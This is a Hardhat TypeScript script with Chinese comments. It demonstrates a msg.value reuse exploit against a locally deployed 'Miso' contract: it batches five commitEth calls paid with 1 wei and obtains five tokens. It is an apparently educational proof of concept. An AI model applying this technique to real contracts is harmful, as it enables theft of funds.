import { ethers } from "hardhat";

async function deploy() {
    const contract = await ethers.getContractFactory("Miso");
    const miso = await contract.deploy(5);
    await miso.waitForDeployment();
    return miso;
}

// 通过abi、Interface构造calldata
async function getCallDataFromInterface() {
    const abi = [
        "function commitEth() external payable"
    ]
    const iface = new ethers.Interface(abi);
    return iface.encodeFunctionData("commitEth()", [])
}
// 通过已部署的合约实例interface获取calldata
async function getCallDataFromContract(contract: any) {
    return contract.interface.encodeFunctionData("commitEth()", [])
}

async function main() {
    const miso = await deploy();

    // const callData = getCallDataFromInterface();
    const callData = getCallDataFromContract(miso);
    console.log("逻辑讲解🐷")
    console.log("部署合约时，调用者有0个token，合约地址有5个token");
    console.log("业务逻辑是🐴：当调用者调用commitEth时，调用者会转移1wei到合约地址中，合约地址会转移1个token到调用者地址中");

    console.log("但实际情况是，调用者调用commitEth时，调用者只转移1wei到合约地址中，合约地址转移了5个token到调用者地址中\n");

    console.log("⏰...开始执行测试用例");

    console.log('🐱调用者调用前的token数量', await miso.balanceOf((await ethers.provider.getSigner()).address))

    //批量调用
    const transaction = await miso.batch(
        [callData, callData, callData, callData, callData],
        { value: 1 });

    await transaction.wait();
    console.log(`🐱调用者调用后的token数量`, await miso.balanceOf((await ethers.provider.getSigner()).address));

    console.log('使用1wei转了5个token到调用者地址中')
}

main()